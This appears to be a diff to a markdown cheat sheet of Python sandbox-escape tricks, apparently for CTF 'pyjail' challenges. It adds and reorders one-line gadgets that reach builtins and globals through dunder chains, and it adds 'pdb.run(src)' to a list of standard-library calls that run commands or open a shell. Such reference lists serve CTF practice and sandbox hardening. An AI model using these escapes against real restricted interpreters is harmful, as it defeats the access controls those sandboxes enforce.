@@ -34,9 +34,10 @@ Table of contents:
 ### No builtins
 
 - `().__class__.__base__.__subclasses__()`
-- `().__setattr__.__objclass__.__subclasses__()`
-- `().__reduce_ex__(2)[0].__globals__`
 - `().__class__.__mro__[1].__subclasses__()`
+- `().__reduce_ex__(2)[0].__builtins__`
+- `().__reduce_ex__(2)[0].__globals__`
+- `().__setattr__.__objclass__.__subclasses__()`
 
 ### No numbers/booleans
 
@@ -47,7 +48,7 @@ Table of contents:
 - `not[]is[]` is `True`
 - `-~x` is `x+1`
 
-### Get shell
+### Get python/bash shell
 
 - `_aix_support._read_cmd_output(cmd)`
 - `_osx_support._read_output(cmd)`
@@ -56,6 +57,7 @@ Table of contents:
 - `code.interact()`
 - `doctest.debug_script(src)`
 - `pdb.set_trace()`
+- `pdb.run(src)`
 - `pydoc.pipe_pager(text, cmd)`
 - `pydoc.tempfile_pager(text, cmd)`
 
